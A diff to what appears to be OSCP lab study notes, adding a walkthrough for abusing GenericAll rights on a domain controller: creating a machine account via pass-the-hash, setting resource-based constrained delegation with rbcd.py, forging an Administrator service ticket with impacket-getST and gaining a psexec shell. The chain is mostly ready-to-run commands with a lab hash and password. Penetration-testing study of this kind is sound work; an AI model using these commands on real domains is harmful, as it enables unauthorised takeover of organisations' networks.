@@ -158,6 +158,51 @@ PS C:\Tools> .\Rubeus.exe asreproast /nowrap
 # sudo hashcat -m 18200 hashes.asreproast2 /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule --force
 ```
 
+### GenericAll Permission on Domain Controller [ DC ]:
+
+Like this : 
+
+![image](https://github.com/kullaisec/OSCP/assets/99985908/109df214-c1d4-483a-a183-f0b8ca91866c)
+
+```
+# impacket-addcomputer resourced.local/l.livingstone -dc-ip 192.168.161.175 -hashes :19a3a7550ce8c505c2d46b5e39d6f808 -computer-name 'hacker$' -computer-pass 'l9z3JiITmvqcwdq'
+```
+```
+PS > get-adcomputer hacker
+```
+![image](https://github.com/kullaisec/OSCP/assets/99985908/1eef77ea-dbd6-4a20-89a8-0c1d01d3ed69)
+
+https://raw.githubusercontent.com/tothi/rbcd-attack/master/rbcd.py
+
+With this account added, we now need a python script to help us manage the delegation rights. Let's grab a copy of rbcd.py and use it to set **msDS-AllowedToActOnBehalfOfOtherIdentity** on our new machine account.
+
+```
+# python3 rbcd.py -dc-ip 192.168.161.175 -t RESOURCEDC -f 'hacker' -hashes :19a3a7550ce8c505c2d46b5e39d6f808 resourced\\l.livingstone
+```
+```
+PS> Get-adcomputer resourcedc -properties msds-allowedtoactonbehalfofotheridentity |select -expand msds-allowedtoactonbehalfofotheridentity
+```
+![image](https://github.com/kullaisec/OSCP/assets/99985908/90d4f7b8-d613-43ae-8c3a-64adb43f3754)
+
+We now need to get the administrator service ticket. We can do this by using impacket-getST with our privileged machine account.
+
+```
+# impacket-getST -spn cifs/resourcedc.resourced.local resourced/hacker\$:'l9z3JiITmvqcwdq' -impersonate Administrator -dc-ip 192.168.161.175
+```
+![image](https://github.com/kullaisec/OSCP/assets/99985908/81fdd1c3-07a3-4712-ad12-533ef3534d73)
+
+This saved the ticket on our Kali host as Administrator@cifs_resourcedc.resourced.local@RESOURCED.LOCAL.ccache. We need to export a new environment variable named KRB5CCNAME with the location of this file.
+
+```
+# export KRB5CCNAME=./Administrator@cifs_resourcedc.resourced.local@RESOURCED.LOCAL.ccache
+```
+
+```
+# impacket-psexec -k -no-pass resourcedc.resourced.local -dc-ip 192.168.161.175
+```
+
+you will get adminsitrator access !!
+
 #### Search anywhere file in windows:
 ```
 > dir /s/b \local.txt
